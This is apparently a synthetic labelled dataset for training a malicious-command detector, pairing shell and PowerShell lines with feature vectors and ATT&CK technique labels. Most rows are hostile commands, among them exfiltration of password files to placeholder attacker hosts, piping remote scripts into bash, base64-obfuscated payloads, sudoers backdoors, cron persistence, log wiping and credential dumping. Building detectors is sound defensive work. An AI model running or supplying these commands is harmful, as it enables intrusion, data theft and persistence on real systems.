command,features,label,source
echo 'cHl0aG9uMyAtYyAiZnJvbSBQSUwgaW1wb3J0IEltYWdlR3JhYjsgSW1hZ2VHcmFiLmdyYWIoKS5zYXZlKCcvdG1wL3MucG5nJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1113_Screen_Capture', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Y2hpc2VsIHNlcnZlciAtLXBvcnQgODA4MCAtLXJldmVyc2U=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1219_Remote_Access_Software', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive ; chmod +x /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'cHVwcGV0IGFwcGx5IC1lICdleGVjIHsgIi90bXAvbWFsd2FyZSI6IH0n' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1072_Software_Deployment_Tools', 'T1027_Obfuscated_Files_or_Information']",synthetic
arecord -d 60 -f cd /tmp/audio.wav,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1123_Audio_Capture'],synthetic
time id,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
id | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.2, 0.2, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggLUcgc3VkbyBuZXdhZG1pbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
xargs -a /tmp/cmds.txt sh -c ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1202_Indirect_Command_Execution', 'T1059_Command_and_Scripting_Interpreter']",synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
ssh -D 1080 -f -N user@jump.host,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1090_Proxy'],synthetic
sed -i 's/old/new/g' config.cfg,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
time ansible -m shell -a 'curl http://evil.com | bash' all,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1072_Software_Deployment_Tools'],synthetic
echo 'Y2VydHV0aWwuZXhlIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovL2F0dGFja2VyLmNvbS9uYy5leGUgbmMuZXhlICYmIGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ping -c 1 -p 4142434445 attacker.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1095_Non_Application_Layer_Protocol'],synthetic
time msiexec /quiet /i http://evil.com/payload.msi,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1218_System_Binary_Proxy_Execution'],synthetic
ansible -m shell -a 'curl http://evil.com | bash' all,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1072_Software_Deployment_Tools'],synthetic
Get-ADDefaultDomainPasswordPolicy,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1201_Password_Policy_Discovery'],synthetic
"bash -c ""echo 'Zm9yIGkgaW4gJChzZXEgMSAyNTQpOyBkbyBwaW5nIC1jMSAtVzEgMTkyLjE2OC4wLiRpICY+L2Rldi9udWxsICYmIGVjaG8gMTkyLjE2OC4wLiRpOyBkb25l' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time dnscat2 --secret=mysecret attacker.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1048_Exfiltration_Over_Alternative_Protocol'],synthetic
netstat -tulpn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
tar -czf /tmp/data.tar.gz /home/*/Documents | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0.2, 0.28, 1, 0]","['T1074_Data_Staged', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y3VybCAtWCBQT1NUIGh0dHA6Ly9ldmlsLmNvbS9jb2xsZWN0IC1kIEAvZXRjL3NoYWRvdyAmJiA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
python3 exploit_rce.py --target http://10.0.0.1:8080/api,"[1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1190_Exploit_Public_Facing_Application'],synthetic
echo  hello  world,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
sudo powershell.exe -EncodedCommand JABzA... | echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
find /root -name '*.key' -exec cp {} /tmp/ \;,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1005_Data_from_Local_System'],synthetic
echo 'c3VkbyAtdSB3d3ctZGF0YSBiYXNo' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
time > ~/.bash_history && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1070_Indicator_Removal'],synthetic
ln -s /tmp/backdoor.sh /etc/cron.d/system-update | history -c,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
mv malware.sh .legit.sh,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1036_Masquerading'],synthetic
"bash -c ""hping3 --icmp --data 1000 10.0.0.99""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1095_Non_Application_Layer_Protocol'],synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1 | sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.4, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
dmesg  |  head  -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
sudo shred -u /var/log/auth.log,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
systemd-detect-virt,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1012_Query_Registry'],synthetic
Get-ADDefaultDomainPasswordPolicy | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]","['T1201_Password_Policy_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bG9jYXRlICoucGRmIHwgeGFyZ3MgY3AgLXQgL3RtcC9sb290Lw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1005_Data_from_Local_System', 'T1027_Obfuscated_Files_or_Information']",synthetic
reg query HKLM\SYSTEM\CurrentControlSet\Services,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1012_Query_Registry'],synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash' ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'cHl0aG9uMyAtYyAiZnJvbSBQSUwgaW1wb3J0IEltYWdlR3JhYjsgSW1hZ2VHcmFiLmdyYWIoKS5zYXZlKCcvdG1wL3MucG5nJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1113_Screen_Capture', 'T1027_Obfuscated_Files_or_Information']",synthetic
sox -t alsa default /tmp/recording.wav trim 0 120 ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.48, 1, 0]","['T1123_Audio_Capture', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers && echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo msiexec /quiet /i http://evil.com/payload.msi,"[0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1218_System_Binary_Proxy_Execution'],synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
echo  'cHl0aG9uMyAtYyAiZnJvbSBQSUwgaW1wb3J0IEltYWdlR3JhYjsgSW1hZ2VHcmFiLmdyYWIoKS5zYXZlKCcvdG1wL3MucG5nJyki'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1113_Screen_Capture', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo net accounts /domain,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1201_Password_Policy_Discovery'],synthetic
"python3 -c ""from PIL import ImageGrab; ImageGrab.grab().save('/tmp/s.png')""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1113_Screen_Capture'],synthetic
ping -c 1 -p 4142434445 attacker.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1095_Non_Application_Layer_Protocol'],synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
grep -r 'SSN\|credit card\|cvv' /home --include='*.txt',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.24, 0, 0]",['T1005_Data_from_Local_System'],synthetic
echo 'Y2hpc2VsIGNsaWVudCAxMC4wLjAuOTk6ODAwMCBSOjgwOjEyNy4wLjAuMTo4MA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1090_Proxy', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
unzip archive.zip -d /opt/,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
gnome-screenshot -f /tmp/grab.png,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1113_Screen_Capture'],synthetic
sudo dmesg | grep -i 'virtual\|vmware\|kvm\|xen',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.8, 0.24, 1, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
nohup for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.6, 0, 0]",['T1110_Brute_Force'],synthetic
"bash -c ""find ~/.mozilla -name '*.xpi' -exec cp {} /tmp/ \;""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 0, 0]",['T1176_Browser_Extensions'],synthetic
"bash -c ""sudo -u www-data bash""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1078_Valid_Accounts'],synthetic
id,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
sudo sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
cat /etc/passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'bnVjbGVpIC11IGh0dHA6Ly90YXJnZXQuY29tIC10IGN2ZXMvIC1zZXZlcml0eSBjcml0aWNhbCxoaWdo' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1190_Exploit_Public_Facing_Application', 'T1027_Obfuscated_Files_or_Information']",synthetic
chmod 644 /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
sudo echo 'c3lzdGVtZC1kZXRlY3QtdmlydCAmJiBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1497_Virtualization_Sandbox_Evasion', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'Y3AgL3Vzci9iaW4vcHl0aG9uMyAvdG1wL3N5c3RlbWQgOyBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1036_Masquerading', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'ZWNobyAnYUdWc2JHOGdkMjl5YkdRPScgfCBiYXNlNjQgLWQ=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1140_Deobfuscate_Decode', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'ZmluZCAvIC13cml0YWJsZSAtdHlwZSBkIDI+L2Rldi9udWxs'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cnN5bmMgLWF2IC9ldGMvIC90bXAvZXRjX2JhY2t1cC8gJiYgc2xlZXAgMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1074_Data_Staged', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo -u www-data bash | sleep 1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
grep -rn 'password\|secret\|token' /etc/ /home/ 2>/dev/null > /tmp/secrets.txt,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.4, 0.32, 0, 0]",['T1119_Automated_Collection'],synthetic
nohup awk -F: '{print $1}' /etc/passwd | head -5 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['BENIGN'],synthetic
nohup echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' && echo done &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
grep -r 'SSN\|credit card\|cvv' /home --include='*.txt',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.24, 0, 0]",['T1005_Data_from_Local_System'],synthetic
"python3 -c ""import base64; exec(base64.b64decode('aW1wb3J0IG9z'))""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1140_Deobfuscate_Decode'],synthetic
echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlciA7IGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /proc/cpuinfo | grep hypervisor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
nohup nbtscan 192.168.1.0/24 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
nohup ./ngrok tcp 22 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1219_Remote_Access_Software'],synthetic
cat /etc/group | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo sqlmap -u 'http://target.com/login?id=1' --dbs --batch ; echo done,"[0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1190_Exploit_Public_Facing_Application', 'T1059_Command_and_Scripting_Interpreter']",synthetic
history -c && history -w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
nohup find / -writable -type d 2>/dev/null &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
mimikatz.exe 'sekurlsa::logonpasswords' exit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
nohup python3 eternalblue.py 10.0.0.5 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1210_Exploitation_Remote_Services'],synthetic
echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZSB8IHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
getent group sudo && > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 auto_collector.py --dirs /home,/etc --ext pdf,docx,kdbx","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1119_Automated_Collection'],synthetic
sudo cat /proc/cpuinfo | grep hypervisor,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
python3 dns_exfil.py --domain attacker.com --file /etc/shadow,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1048_Exfiltration_Over_Alternative_Protocol'],synthetic
echo 'ZnBpbmcgLWEgLWcgMTkyLjE2OC4xLjAvMjQgMj4vZGV2L251bGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Z3JlcCAtcm4gJ3Bhc3N3b3JkXHxzZWNyZXRcfHRva2VuJyAvZXRjLyAvaG9tZS8gMj4vZGV2L251bGwgPiAvdG1wL3NlY3JldHMudHh0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1119_Automated_Collection', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo Start-BitsTransfer -Source http://evil.com/shell.exe -Destination $env:TEMP,"[0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1197_BITS_Jobs'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
ps aux | grep nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.2, 1, 0]",['BENIGN'],synthetic
time rm -rf /tmp/* /var/tmp/*,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1070_Indicator_Removal'],synthetic
